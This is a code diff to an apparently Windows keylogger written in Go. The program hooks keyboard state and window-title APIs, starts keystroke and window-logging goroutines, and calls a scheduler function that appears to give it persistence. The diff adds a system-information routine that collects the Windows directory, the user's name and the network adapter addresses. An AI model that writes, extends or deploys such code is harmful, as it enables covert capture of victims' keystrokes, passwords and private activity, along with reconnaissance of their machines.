@@ -1,9 +1,12 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"math"
+	"net"
 	"os/exec"
+	"os/user"
 	"strconv"
 	"syscall"
 	"time"
@@ -13,7 +16,9 @@ import (
 )
 
 var (
-	user32                       = syscall.NewLazyDLL("user32.dll")
+	user32   = syscall.NewLazyDLL("user32.dll")
+	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+
 	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
 	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
 	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
@@ -24,11 +29,15 @@ var (
 	procToUnicode                = user32.NewProc("ToUnicode")
 	procActivateKeyboardLayout   = user32.NewProc("ActivateKeyboardLayout")
 
+	procGetSystemWindowsDirectory = kernel32.NewProc("GetSystemWindowsDirectoryA")
+
 	tmpTitle string
 )
 
 var tmpKeylog = make(chan string)
 var tmpWindow = make(chan string)
+
+// User32.dll
 
 func getForegroundWindow() (hwnd syscall.Handle, err error) {
 	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
@@ -127,6 +136,44 @@ func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32,
 		}
 	}
 	return
+}
+
+// Kernel32.dll
+
+func getSystemWindowsDirectory(lpBuffer *byte) (len int32, err error) {
+	r0, _, e1 := syscall.Syscall(procGetSystemWindowsDirectory.Addr(), 2, uintptr(unsafe.Pointer(lpBuffer)), 256, 0)
+	len = int32(r0)
+
+	if len == 0 {
+		if e1 != 0 {
+			err = error(e1)
+		} else {
+			err = syscall.EINVAL
+		}
+	}
+	return
+}
+
+func getSystemInfo() {
+	windowsDirectory := make([]byte, 256)
+	_, getWindowsDirectoryErr := getSystemWindowsDirectory(&windowsDirectory[0])
+	if getWindowsDirectoryErr != nil {
+		log.Fatalf("getWindowsDirectory -> %v", getWindowsDirectoryErr)
+	}
+
+	user, userErr := user.Current()
+	if userErr != nil {
+		log.Fatalf("user.Current() -> %v", userErr)
+	}
+
+	interfaceAddrs, interfaceAddrsErr := net.InterfaceAddrs()
+	if interfaceAddrsErr != nil {
+		log.Fatalf("net.InterfaceAddrs() -> %v", interfaceAddrsErr)
+	}
+
+	fmt.Println("Windows Folder ", string(windowsDirectory))
+	fmt.Println("User Name ", user.Name, user.Username)
+	fmt.Println("Adapter ", interfaceAddrs)
 }
 
 func windowLogger() {
@@ -375,6 +422,7 @@ func addScheduler() {
 func main() {
 	log.Println("Starting...")
 	addScheduler()
+	getSystemInfo()
 	go keyLogger()
 	go windowLogger()
 	go keyLoggerListener()
